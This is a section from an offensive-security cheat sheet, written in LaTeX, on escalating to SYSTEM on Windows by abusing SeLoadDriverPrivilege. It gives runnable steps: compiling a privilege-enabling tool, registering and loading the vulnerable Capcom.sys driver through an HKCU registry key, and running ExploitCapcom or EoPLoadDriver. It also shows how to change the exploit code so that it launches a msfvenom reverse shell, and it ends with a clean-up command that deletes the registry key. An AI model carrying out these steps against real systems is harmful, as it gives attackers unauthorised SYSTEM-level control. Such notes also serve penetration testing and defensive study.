\subsection{Abusing Buil-in: Print Operators (SeLoadDriverPrivilege)}

{\bf Note}: Since Windows 10 Version 1803, the {\emph SeLoadDriverPrivilege} is not exploitable, as it is no longer possible to include references to registry keys under "\verb+HKEY_CURRENT_USER+".

\subsubsection{Capcom Driver}


It's well known that the driver Capcom.sys contains functionality to allow any user to execute shellcode with SYSTEM privileges. {\emph SeLoadDriverPrivilege} allow to load this vulnerable driver and escalate privileges.

{\bf GUI exploit}

\begin{enumerate}
	\item download \href{https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp}{EnableSeLoadDriverPrivilege.cpp} to enable privilege as well as load the driver.

	\item edit the headers to include \verb+<stdio.h>+ and \verb+"tchar.h"+

	\item compile the file from Visual Studio (\verb+cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp+)
	
	\item Download \verb+Capcom.sys+ driver \href{https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys}{here}.
	
	\item  add a reference to this driver under \verb+HKEY_CURRENT_USER+ tree
\begin{verbatim}
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\PATH_TO\Capcom.sys"
\end{verbatim}

	\item enable SeLoadDriverPrivilege and load the driver


	\item verify that the Capcom driver is listed using Nirsoft's \href{http://www.nirsoft.net/utils/driverview.html}{DriverView.exe}
	
	\item use \href{https://github.com/tandasat/ExploitCapcom}{ExploitCapcom} tool to escalate privileges.
\begin{verbatim}
DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom	
\end{verbatim}

\end{enumerate}

this can be automated using \href{https://github.com/tandasat/ExploitCapcom}{ ExploitCapcom tool after compiling with it Visual Studio}



{\bf No GUI exploit}

Without GUI access to the target, it is necessary  to modify the \verb+ExploitCapcom.cpp+ code to call for example a reverse shell crafted with msfvenom.

\begin{verbatim}
<<<<<
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
>>>>>
TCHAR CommandLine[] = TEXT("PATH_TO_EXEC_TO_CALL");
\end{verbatim}

{\bf Automating with EopLoadDriver}

\href{https://github.com/TarlogicSecurity/EoPLoadDriver/}{EoPLoadDriver} allow to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver.

\begin{verbatim}
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\PATH_TO\Capcom.sys
\end{verbatim}



{\bf Clean-up}

\begin{verbatim}
reg delete HKCU\System\CurrentControlSet\Capcom
\end{verbatim}

